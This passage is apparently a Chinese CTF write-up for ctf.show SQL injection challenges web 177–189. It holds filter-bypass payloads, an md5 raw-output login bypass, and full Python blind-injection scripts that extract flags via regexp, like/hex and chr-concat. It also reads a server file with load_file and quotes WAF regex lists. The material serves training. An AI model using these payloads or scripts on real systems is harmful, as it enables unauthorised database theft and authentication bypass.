+<h2 id="web-177-空格过滤"><a href="#web-177-空格过滤" class="headerlink" title="web 177(空格过滤)"></a>web 177(空格过滤)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or%091=1%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload:</span></span><br><span class="line"><span class="string">1&#x27;</span>union%09sElect%091,<span class="number">2</span>,group_concat(password)%09<span class="keyword">from</span>%09ctfshow_user%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+
+<p>贴个小tips：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绕过空格姿势:(暂时只想起来这么多后面再补)</span><br><span class="line">%<span class="number">09</span> %<span class="number">0</span>a %<span class="number">0</span>c %<span class="number">0</span>b %<span class="number">0</span>d <span class="comment">/**/</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-178"><a href="#web-178" class="headerlink" title="web 178()"></a>web 178()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">暂时这题不知道过滤了什么。</span><br><span class="line">payload:</span><br><span class="line">1&#x27;or%091=1%23</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">1&#x27;union%09select%091,2,group_concat(password)%09from%09ctfshow_user%23</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-179-过滤-0a-09"><a href="#web-179-过滤-0a-09" class="headerlink" title="web 179(过滤%0a,%09)"></a>web 179(过滤%0a,%09)</h2><p>简单测试过后，很容易发现过滤了%0a,%09。那么我们采用手工闭合或者%0c</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">or</span>(<span class="number">1</span>)=(<span class="number">1</span>)%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;union%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-180-过滤注释-–"><a href="#web-180-过滤注释-–" class="headerlink" title="web 180(过滤注释#,–+)"></a>web 180(过滤注释#,–+)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;--%0c-</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload:</span></span><br><span class="line"><span class="string">1&#x27;</span>union%0cselect%0c1,<span class="number">2</span>,group_concat(password)%0cfrom%0cctfshow_user--%0c-</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-181-182-过滤select"><a href="#web-181-182-过滤select" class="headerlink" title="web 181-182(过滤select)"></a>web 181-182(过滤select)</h2><p>这题直接给出了过滤列表了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\<span class="comment">#|file|into|select/i</span></span><br></pre></td></tr></table></figure>
+
+
+<p>可以看到最关键的select被过滤了。</p>
+<p>这里卡住了，因为没有select太不好操作了。而handler需要能够连续执行语句的时候才能用。</p>
+<p>去看了看师傅们的WP。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">-<span class="number">1</span><span class="string">&#x27;or(id=26)and&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这个payload读一下还是能读懂的。</p>
+<h2 id="web-183-正则比较注入"><a href="#web-183-正则比较注入" class="headerlink" title="web 183(正则比较注入)"></a>web 183(正则比较注入)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>可以看到这题有回显，并且返回pass的条目。</p>
+<p>这里进行了好久的测试。刚开始用的chr(32)~chr(127)。但是发现因为我们使用的是正则匹配，因此我们的通配符会被算上。直接雪崩。</p>
+<p>后面采用了最简单的枚举法。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 20:25:26</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-18 20:47:53</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&quot;http://3df76f1c-80a4-442b-921e-7c8e77b7be14.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">letter = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):  <span class="comment">#此处可适当调大</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        temp_flag = flag+j</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;(ctfshow_user)where(pass)regexp(&#x27;^ctfshow&#123;&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(temp_flag)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="comment">#print(data[&#x27;tableName&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="comment">#ctfshow&#123;2a41856e-f78f-4805-9c6b-3c159f2eed50&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-184-having代替where-like盲注-十六进制替代"><a href="#web-184-having代替where-like盲注-十六进制替代" class="headerlink" title="web 184(having代替where,like盲注,十六进制替代)"></a>web 184(having代替where,like盲注,十六进制替代)</h2><p>此题在上一题的基础上过滤了单双引号。where。</p>
+<p>并且因为没有了单双引号，因此我们无法继续采用正则匹配。因此我们只能使用非字符串的方式来匹配。那么选择使用16进制来匹配。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-18 21:15:25</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&quot;http://345bf49b-6769-4ef8-83bd-b502bb7928fb.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asc2hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    a1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    a2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        a1+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    a2 = a1.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> a2</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        temp_flag = flag+j</span><br><span class="line">        data =&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass like (&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+asc2hex(temp_flag+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data[&quot;tableName&quot;])</span></span><br><span class="line"></span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;ff9725af-75f3-4aad-b5a4-176d7bf6c717&#125; </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-185-186-true代替数字-concat-chr代替引号"><a href="#web-185-186-true代替数字-concat-chr代替引号" class="headerlink" title="web 185-186(true代替数字,concat+chr代替引号)"></a>web 185-186(true代替数字,concat+chr代替引号)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> preg_match(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>这里可以看出在上一题的基础上更过滤了数字0-9.</p>
+<p>抄了一个脚本，师傅们tql.</p>
+<p>这里的核心在like后面使用了concat+chr的方式来得到字符串。</p>
+<p>然后数字使用了true+true=2这种方式来绕过。</p>
+<p>总体就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">like concat(chr(<span class="literal">true</span>+<span class="literal">true</span>),chr(<span class="literal">true</span>+<span class="literal">true</span>)) —&gt;like <span class="string">&quot;ctfshow&#123;&quot;</span>—&gt;得到flag</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-19 10:23:39</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createNum</span>(<span class="params">n</span>):</span></span><br><span class="line">    num = <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createstrNum</span>(<span class="params">m</span>):</span></span><br><span class="line">    _<span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> m:</span><br><span class="line">        _<span class="built_in">str</span> += <span class="string">&quot;,chr(&quot;</span> + createNum(<span class="built_in">ord</span>(j)) + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> _<span class="built_in">str</span>[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://6e155536-4130-4c33-899e-241450edf3b5.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&#x27;ctfshow_user group by pass having pass like concat(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(createstrNum(flag + j +<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="comment">#print(data[&quot;tableName&quot;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line"><span class="comment">#ctfshow&#123;55d05897-933b-4796-99f3-5cfe49a5436a&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-187-md5注入"><a href="#web-187-md5注入" class="headerlink" title="web 187(md5注入)"></a>web 187(md5注入)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = &#x27;<span class="subst">$username</span>&#x27; and password= &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">   <span class="variable">$password</span> = md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//只有admin可以获得flag</span></span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">       <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不存在&#x27;</span>;</span><br><span class="line">       <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里问题主要在这个MD5函数上面。因为MD5函数存在两个参数，其中第二个参数默认为false。当其为true的时候，会返回16位原始二进制字符串。因此这里我们需要找到一个转换为原始16位二进制字符串后满足我们的注入。</p>
+<p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/19/WewR78hx5XaCTmq.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p>
+<p>可以看到很明显这里我们存在单引号，那么可以直接注入了。</p>
+<p>注入后就变成了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = &#x27;admin&#x27; and password= &#x27;&#x27;or&#x27;6xxxxxx&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+<p>这里只要是数字1之类的都会被判断为true。因此成功登陆了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">username:admin</span><br><span class="line">password:ffifdyop</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">username:admin</span><br><span class="line">password:<span class="number">129581926211651571912466741651878684928</span></span><br></pre></td></tr></table></figure>
+
+
+<p>抓包即拿到flag</p>
+<p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/19/KDOvBsbpZAX8Jrh.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p>
+<h2 id="web-188-mysql弱比较"><a href="#web-188-mysql弱比较" class="headerlink" title="web 188(mysql弱比较)"></a>web 188(mysql弱比较)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==intval(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    array_push(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+
+<p>可以看到这里登陆成功就有flag。</p>
+<p>第一想法是对admin的密码进行修改。然后登陆成功即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;<span class="keyword">and</span> update ctshow_user set pass=<span class="number">123</span> where username = admin%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+
+<p>但是行不通。看着这么多眼熟的函数，上网搜了搜，mysql里面也存在弱比较。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.字符串当作数字处理</span><br><span class="line">  即当mysql中字符串与数字做比较的时候，会将字符串当作数字来比较。如<span class="number">123</span>bac会当作<span class="number">123</span>处理。</span><br><span class="line">  因此我们在查询的时候即使username=<span class="number">0</span>，也会返回一些以<span class="number">0</span>开头的数据。</span><br><span class="line"><span class="number">2</span>.品一下下面的句子。</span><br></pre></td></tr></table></figure>
+
+
+<p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/19/YDRMFk1vHInS2wL.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p>
+<p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/19/aNj8pICesuEyKQr.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">username=<span class="number">0</span>&amp;password=<span class="number">0</span></span><br><span class="line">payload2:</span><br><span class="line">username=<span class="number">1</span>||<span class="number">1</span>&amp;password=<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-189-load-file-regexp盲注"><a href="#web-189-load-file-regexp盲注" class="headerlink" title="web 189(load_file+regexp盲注)"></a>web 189(load_file+regexp盲注)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>可以很清晰得看出这里没有空格了。所有空格都没了。在题目下给了一个hint:flag在/api/index.php中。</p>
+<p>那么合理猜测我们需要去读index.php的内容。然后看load_file没有被ban掉。</p>
+<p>根据目录应该时/var/www/html/api/index.php</p>
+<p>测试了一下。回显只有查询失败和密码错误。那么想到了盲注。配合regexp使用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(load_file(<span class="string">&quot;/var/www/html/api/index.php&quot;</span>)regexp(<span class="string">&quot;ctfshow&#123;&quot;</span>),<span class="number">0</span>,<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+<p>上脚本跑</p>
